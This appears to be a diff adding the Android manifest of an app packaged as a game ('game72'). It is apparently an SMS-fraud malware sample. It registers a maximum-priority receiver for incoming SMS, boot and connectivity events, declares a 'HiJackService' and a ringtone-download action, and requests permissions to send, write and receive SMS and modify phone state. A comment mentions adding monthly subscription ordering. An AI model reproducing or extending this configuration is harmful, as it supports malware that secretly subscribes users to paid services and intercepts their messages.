@@ -1,0 +1,122 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="cn.com.tiantong.game72"
+    android:versionCode="1"
+    android:versionName="9.0" >
+
+    <uses-sdk android:minSdkVersion="7" />
+
+    <application
+        android:icon="@drawable/icon"
+        android:label="@string/app_name"
+        android:name="cn.com.tiantong.game72.MyApplication"
+       >
+       <activity
+            android:label="@string/app_name"  
+            android:screenOrientation="portrait" 
+            android:name="cn.com.tiantong.game72.PlayActivity" >
+            <intent-filter >
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>  
+        </activity>
+        
+        <activity
+            android:name="cn.com.tiantong.game72.push.ShowActivity"
+            android:launchMode="singleTask" >                              
+        </activity>
+        
+        <receiver android:name="cn.com.tiantong.game72.ControlBroadcastReceiver">
+           <intent-filter android:priority="2147483647"> 
+               <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            
+            
+            <intent-filter android:priority="2147483647">
+				<action android:name="android.intent.action.PACKAGE_ADDED" />
+				<data android:scheme="package" />
+			</intent-filter>
+			
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />	
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.INPUT_METHOD_CHANGED" />
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            
+            <intent-filter android:priority="2147483647">
+                <action android:name="com.android.cation.download_cailing" />
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            
+             <intent-filter android:priority="2147483647">
+                <action android:name="com.download.cailing.test" />
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+		
+            <intent-filter android:priority="2147483647">
+				<action android:name="android.intent.action.SIG_STR" />
+				<category android:name="android.intent.category.DEFAULT" />											
+			</intent-filter>
+            
+        </receiver>     
+        
+        <service android:name="cn.com.tiantong.game72.PlayService" android:enabled="true" android:exported="true">
+            <intent-filter>
+                <action android:name="cn.com.tiantong.game72.PlayService" />
+            </intent-filter>
+        </service>
+        <service android:name="cn.com.tiantong.game72.HiJackService" android:enabled="true"	android:exported="true">
+            <intent-filter>
+                <action android:name="cn.com.tiantong.game72.HiJackService"/>
+            </intent-filter>
+        </service>
+             
+         <meta-data android:name="appid" android:value="appid:000000000000000000"/>                  
+    </application>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <!-- 友盟权限 -->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"></uses-permission>
+	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+	<uses-permission android:name="android.permission.INTERNET"></uses-permission>
+	<uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>
+	<!-- 在SDCard中创建与删除文件权限 -->  
+	<uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>  
+	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+	<!--添加包月订购 -->
+	<uses-permission android:name="android.permission.INTERNET"/>
+	<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+	<uses-permission android:name="android.permission.SEND_SMS"/>
+	<uses-permission android:name="android.permission.WRITE_SMS"/>
+	<uses-permission android:name="android.permission.RECEIVE_SMS"/>
+	
+</manifest>
